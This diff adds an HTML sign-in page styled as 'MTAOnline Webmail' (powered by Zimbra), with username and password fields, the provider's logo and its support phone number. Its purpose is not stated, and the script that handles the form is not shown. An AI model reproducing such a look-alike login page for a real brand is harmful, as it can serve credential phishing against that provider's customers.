@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTAOnline Webmail</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-container">
+                <img src="images/images(1).png" alt="MTA Logo" class="logo">
+            </div>
+            <h1>Webmail</h1>
+        </header>
+        
+        <main>
+            <div class="login-container">
+                <div class="welcome-message">
+                    <h2>Welcome to MTA Webmail</h2>
+                    <p>Please sign in to access your email account</p>
+                </div>
+                
+                <form id="loginForm" class="login-form">
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">Sign In</button>
+                    
+                    <div class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="info-container">
+                <div class="info-box">
+                    <h3>First time user?</h3>
+                    <p>If this is your first time logging in, your username is your full email address.</p>
+                </div>
+                
+                <div class="info-box">
+                    <h3>Need help?</h3>
+                    <p>Contact MTA Technical Support at (907) 761-5151 for assistance.</p>
+                </div>
+            </div>
+        </main>
+        
+        <footer>
+            <p>&copy; <span id="currentYear"></span> MTA. All rights reserved.</p>
+            <p>Powered by Zimbra</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
